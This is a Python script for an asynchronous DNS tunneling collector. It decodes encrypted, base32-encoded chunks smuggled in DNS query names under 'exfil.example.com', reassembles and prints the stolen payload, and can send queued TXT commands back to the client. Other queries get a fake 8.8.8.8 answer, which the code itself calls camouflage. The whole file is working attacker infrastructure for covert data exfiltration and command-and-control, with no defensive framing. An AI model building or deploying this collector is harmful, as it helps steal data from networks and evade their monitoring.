#!/usr/bin/env python3
"""
High-Performance Asynchronous DNS Tunneling Collector
- Event-driven non-blocking I/O loop using asyncio
- Decoupled, asynchronous state management
- Keeps the exact same AES-GCM + HMAC crypto specification
"""

import asyncio
import base64
import struct
import sys
import time
from collections import defaultdict
from dnslib import DNSRecord, QTYPE, RR, A, TXT

# Assuming CryptoEngine from previous iterations is accessible
# For standalone execution, ensure pycryptodome is available.
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256

class AsyncCryptoEngine:
    def __init__(self, secret: bytes):
        if len(secret) < 32:
            raise ValueError("Secret must be >= 256-bit")
        self.master_secret = secret

    def _derive_key(self, session_id: bytes) -> bytes:
        h = HMAC.new(self.master_secret, digestmod=SHA256)
        h.update(session_id)
        return h.digest()[:32]

    def decrypt(self, blob: bytes, session_id: bytes) -> bytes:
        if len(blob) < 12 + 16 + 4:
            raise ValueError("Ciphertext too short")
        key = self._derive_key(session_id)
        nonce = blob[:12]
        tag = blob[-20:-4]
        hmac_tag = blob[-4:]
        ciphertext = blob[12:-20]

        h = HMAC.new(key, digestmod=SHA256)
        h.update(nonce + ciphertext + tag)
        if not h.digest()[:4] == hmac_tag:
            raise ValueError("HMAC verification failed")

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)


class AsyncDNSTunnelProtocol(asyncio.DatagramProtocol):
    def __init__(self, domain: str, crypto: AsyncCryptoEngine):
        self.domain = domain.lower()
        self.crypto = crypto
        self.transport = None
        
        # State tracking caches
        self.session_buffers = defaultdict(lambda: {"chunks": {}, "total_expected": None})
        self.downstream_queue = defaultdict(list)

    def connection_made(self, transport):
        self.transport = transport
        print(f"[+] Async DNS Engine active. Listening on UDP port...")

    def datagram_received(self, data: bytes, addr: tuple):
        # Schedule the packet parsing onto the event loop immediately 
        # to unblock the socket for subsequent incoming packets
        asyncio.create_task(self.process_packet(data, addr))

    async def process_packet(self, data: bytes, addr: tuple):
        try:
            request = DNSRecord.parse(data)
        except Exception:
            return # Drop malformed raw UDP junk

        reply = request.reply()
        qname = str(request.q.qname).rstrip(".").lower()
        qtype = QTYPE[request.q.qtype]
        active_session_key = None

        if qname.endswith(self.domain):
            prefix = qname[: -(len(self.domain) + 1)]
            payload_label = prefix.replace(".", "").upper()

            # Fix base32 padding constraints
            pad_len = (-len(payload_label)) % 8
            payload_label += "=" * pad_len

            try:
                # Offload heavy cryptographic CPU calculations to an executor if scaling up
                # For baseline async loop efficiency, we process short blocks inline
                raw = base64.b32decode(payload_label)
                if len(raw) >= 16:
                    session_id = raw[:16]
                    active_session_key = session_id.hex()
                    ciphertext = raw[16:]

                    # Decrypt packet payload
                    plaintext = self.crypto.decrypt(ciphertext, session_id)
                    seq_num, is_last, data_len = struct.unpack("!HBB", plaintext[:4])
                    actual_chunk_data = plaintext[4 : 4 + data_len]

                    # Update internal buffer mapping
                    buffer = self.session_buffers[active_session_key]
                    buffer["chunks"][seq_num] = actual_chunk_data

                    if is_last == 1:
                        buffer["total_expected"] = seq_num + 1

                    # Reassembly check
                    if buffer["total_expected"] is not None and len(buffer["chunks"]) == buffer["total_expected"]:
                        await self.finalize_stream(active_session_key, addr)

            except Exception as e:
                print(f"[-] Processing fault from {addr[0]}: {e}")

        # Construct responsive downstream messaging
        if qtype == "TXT" and active_session_key and self.downstream_queue[active_session_key]:
            msg = self.downstream_queue[active_session_key].pop(0)
            reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=1, rdata=TXT(msg)))
        else:
            # Standard structural camouflage response
            reply.add_answer(RR(request.q.qname, QTYPE.A, ttl=1, rdata=A("8.8.8.8")))

        # Ship response back asynchronously
        self.transport.sendto(reply.pack(), addr)

    async def finalize_stream(self, session_key: str, addr: tuple):
        """Asynchronously formats, flushes, and logs the unified data payload."""
        buffer = self.session_buffers[session_key]
        ordered_chunks = [buffer["chunks"][i] for i in range(buffer["total_expected"])]
        full_payload = b"".join(ordered_chunks)

        # Print clean output without blocking the main event stream loop
        print(f"\n[★] STREAM REASSEMBLED [{session_key[:8]}] from {addr[0]}")
        print(f"    Payload: {full_payload.decode('utf-8', 'replace')}")

        # Purge memory footprint
        del self.session_buffers[session_key]


async def main():
    # Configuration boundaries
    BIND_IP = "0.0.0.0"
    BIND_PORT = 5353  # Using 5353 for local user-space environments
    TARGET_DOMAIN = "exfil.example.com"
    
    # Mocking dummy key loading for operational visibility
    mock_secret = b"A" * 32 
    crypto_engine = AsyncCryptoEngine(mock_secret)

    loop = asyncio.get_running_loop()
    
    print(f"[*] Initializing asynchronous server pipeline on {BIND_IP}:{BIND_PORT}...")
    transport, protocol = await loop.create_datagram_endpoint(
        lambda: AsyncDNSTunnelProtocol(TARGET_DOMAIN, crypto_engine),
        local_addr=(BIND_IP, BIND_PORT)
    )

    try:
        # Keep the event loop open infinitely
        while True:
            await asyncio.sleep(3600)
    except KeyboardInterrupt:
        print("\n[-] Shutting down asynchronous processing framework.")
    finally:
        transport.close()

if __name__ == "__main__":
    # Standard modern async launcher loop block
    asyncio.run(main())